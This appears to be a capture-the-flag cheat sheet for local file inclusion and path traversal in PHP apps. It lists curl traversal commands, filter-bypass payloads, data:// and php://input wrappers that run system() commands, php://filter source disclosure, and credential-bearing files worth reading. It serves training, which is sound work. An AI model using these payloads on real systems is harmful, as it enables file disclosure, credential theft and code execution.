# LFI / Path Traversal

## Goal
Make a file-loading parameter open a file it should not.

**Fast path (script)** — all scripts: [15_scripts](15_scripts.md)
```bash
ctf --lfi "curl -s 'http://$IP/reader.php?page={P}'" --file /var/www/secrets/notes.txt     # {P} = where the path goes; --file = the file the Q names
ctf --lfi "curl -s 'http://$IP/reader.php?page={P}'" --file /etc/passwd                     # only: is it LFI, and which bypass works
```
Misses / wrong → by hand below.

**Checklist**
- [ ] param carries a filename? (`?page=welcome.php` `?file=` `?lang=en.php` `?doc=`)
- [ ] target path given in Q? ("folder beside / above the web root")
- [ ] plain `../` returns nothing → filter → Step 2
- [ ] target ends `.php` → it runs instead of printing → Step 3

# Commands

### Step 1: plain traversal
```bash
curl -s "http://$IP/reader.php?page=../secrets/notes.txt"
curl -s "http://$IP/reader.php?page=../../secrets/notes.txt"           # add ../ until it works
curl -s "http://$IP/reader.php?page=../../../../../../etc/passwd"      # proof it works (extra ../ are harmless)
```
"Beside the web root": page file in `/var/www/html/` → `../secrets/x` = `/var/www/secrets/x`.
Default value already has folders (`?page=content/lang/en.php`) → one more `../` per folder.

### Step 2: filter bypass
```text
....//....//secrets/review.txt          filter deletes "../" once → "....//" collapses into "../"
..././..././secrets/review.txt          same idea
%2e%2e%2fsecrets/review.txt             URL-encoded ../
%252e%252e%252fsecrets/review.txt       double-encoded
/var/www/secrets/review.txt             absolute path, no ../ needed
../se<word>crets/…  e.g. sesecretscrets  filter deletes a WORD (folder name) once → write the word inside itself
..%2f..%2fsecrets/review.txt            only the slash encoded
../secrets/review.txt%00                app adds an extension itself (old PHP) → null byte cuts it off
```
Two filters at once → stack the tricks: `....//....//sesecretscrets/<file>`. Other wrappers when `php://filter` is blocked:
```text
data://text/plain,<?php system('cat ../secrets/flag.txt'); ?>          runs your code (needs allow_url_include)
php://input      with the code as POST body:  curl -s "http://$IP/x.php?page=php://input" -d "<?php system('id'); ?>"
file:///etc/passwd
```

### Step 3: read PHP source (page comes back blank because the file executed)
```bash
curl -s "http://$IP/archive.php?page=php://filter/convert.base64-encode/resource=../secrets/audit.php"
# page now contains a base64 blob → pull it out + decode in one go:
curl -s "http://$IP/archive.php?page=php://filter/convert.base64-encode/resource=../secrets/audit.php" | grep -oE '[A-Za-z0-9+/]{20,}={0,2}' | base64 -d
```
Filter present too → combine: `resource=....//secrets/audit.php`. Read the page's own code: `resource=archive.php`.

### Worth reading
`/etc/passwd` · `flag.txt` `../flag.txt` `/flag` · `index.php` `config.php` (via Step 3) · `.htpasswd` · `/proc/self/environ` · `/var/log/apache2/access.log`

### Helpline
```bash
# blank page = wrong depth (add/remove ../) OR filter (Step 2) OR it is PHP (Step 3).
# error text "failed to open stream: … '/var/www/html/pages/xyz'" shows the real path tried → fix yours from it.
# app adds ".php" itself → give the name without extension: resource=../secrets/audit
# ../ inside the PATH (not after ?) → curl --path-as-is "http://$IP/a/../../etc/passwd"   (curl removes ../ otherwise)
# browser works too: paste the payload after ?page=
# zsh: quote the URL.
```
